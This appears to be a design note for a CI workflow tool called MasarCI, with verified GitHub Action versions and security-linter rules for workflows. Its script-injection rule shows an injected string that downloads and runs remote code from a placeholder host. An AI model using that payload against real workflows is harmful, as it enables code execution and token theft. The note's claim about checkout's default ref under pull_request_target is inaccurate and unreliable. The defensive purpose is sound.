# MasarCI · Product Facts

> Verified 2026-07-22 per huashu-design core principle #0 (fact-verification before assumption).
> **Never ship a preset SHA or major tag from memory — these move. Re-verify at implementation time.**

## GitHub Action major versions (verified from each repo's Releases page)

| Action | Latest tag | Latest release date | Major to pin | Source |
|---|---|---|---|---|
| `actions/checkout` | v7.0.1 | 2026-07-20 | **@v7** | github.com/actions/checkout/releases |
| `actions/setup-node` | v7.0.0 | 2026-07-14 | **@v7** | github.com/actions/setup-node/releases |
| `actions/setup-python` | v7.0.0 | 2026-07-20 | **@v7** | github.com/actions/setup-python/releases |
| `actions/cache` | v6.1.0 | 2026-06-26 | **@v6** | github.com/actions/cache/releases |
| `actions/upload-artifact` | v7.0.1 | 2026-04-10 | **@v7** | github.com/actions/upload-artifact/releases |
| `actions/download-artifact` | v8.0.1 | recent | **@v8** | github.com/actions/download-artifact/releases |
| `docker/login-action` | v4.4.0 | 2026-07-03 | **@v4** | github.com/docker/login-action/releases |
| `docker/build-push-action` | v7.3.0 | 2026-07-01 | **@v7** | github.com/docker/build-push-action/releases |
| `aws-actions/amazon-ecr-login` | v2.1.6 | 2026-06-12 | **@v2** | github.com/aws-actions/amazon-ecr-login/releases |
| `actions/deploy-pages` | v5.0.0 | 2026-03-25 | **@v5** | github.com/actions/deploy-pages/releases |

> ⚠️ The source prompt (id `092`) assumed `@v4` for checkout/setup-node and was written for an earlier era. **As of 2026-07-22 these are all at v7.** The mockup + presets must use the verified majors above, not the spec's `@v4`.

### SHA pinning approach (for preset data at implementation)

Major tags (`@v7`) are the *display* default for readability. For supply-chain hardening, MasarCI recommends commit-SHA pinning. At implementation, fetch the 40-char SHA for the chosen tag via:

```bash
git ls-remote https://github.com/actions/checkout.git refs/tags/v7.0.1
```

Store as `actions/checkout@<sha> # v7.0.1`. The linter's `unpinned-action` rule flags `@master`/`@main` and floating mutable refs; SHA and major-tag refs pass (major tag = warning-level "ok", SHA = best).

## Security linter rules — authoritative source

**Source of truth:** GitHub Docs — *"Security hardening for GitHub Actions"* (`https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions`, verified accessible 2026-07-22, © 2026 GitHub, Inc.). The page documents both **Script injections** and the `pull_request_target` risk.

> Note: `securitylab.github.com/research/github-actions-unsanitized-input/` returned HTTP 404 on 2026-07-22; the canonical, currently-live reference is the GitHub Docs security-hardening page above.

### Rule 1 — Script Injection (Critical)

**Vulnerable pattern** (interpolating untrusted `github.event.*` directly into a `run:` block):

```yaml
- name: Echo issue title
  run: echo "${{ github.event.issue.title }}"   # ❌ CRITICAL
```

**Why exploitable:** `github.event.*` values (issue/PR titles, branch names, commit messages, comment bodies) are attacker-controlled. When interpolated directly into a `run:` shell, a crafted string like `"; curl evil.sh | sh #` executes arbitrary shell with the runner's token.

**Secure fix (MasarCI auto-fix):** hoist the untrusted value into a step-level `env:` variable, then reference the shell variable — GitHub does **not** expand `env:` values as expressions, so the shell sees them as inert string data:

```yaml
- name: Echo issue title
  env:
    TITLE: ${{ github.event.issue.title }}   # ✅ safe intermediary
  run: echo "$TITLE"
```

This is the exact fix the spec §16 security test demands (`run: echo ${{ github.event.issue.title }}` → Critical + `env: TITLE:` alternative).

### Rule 2 — `pull_request_target` + `checkout` of PR head (Critical)

`pull_request_target` runs the workflow with the **base branch's** token and access to secrets — but `actions/checkout` defaults to the PR head SHA when triggered by `pull_request_target`. Checking out + executing attacker-controlled code with base-repo privileges = token/secret theft.

**Flag:** any job with `on: pull_request_target` that runs `actions/checkout` (or any build/run step) without explicitly pinning `ref: ${{ github.event.pull_request.base.sha }}`. Severity: Critical.

### Rule 3 — Unpinned actions (Warning)

Flags `uses: org/repo@master`, `@main`, or floating mutable refs. Recommends major tag (`@v7`) minimum, commit SHA best.

### Rule 4 — Excessive / missing `permissions:` (Warning)

Workflows without an explicit top-level `permissions:` (least privilege) get the broad default token. Auto-fix: inject `permissions: { contents: read }` (or narrower based on detected steps).

## Do not hallucinate at implementation

- Exact commit SHAs → `git ls-remote` at build time, recorded in preset data.
- Any new action added to the marketplace → re-verify its latest tag from its Releases page before shipping a preset.
- Linter rule wording → re-check the GitHub Docs security-hardening page if it has been updated.
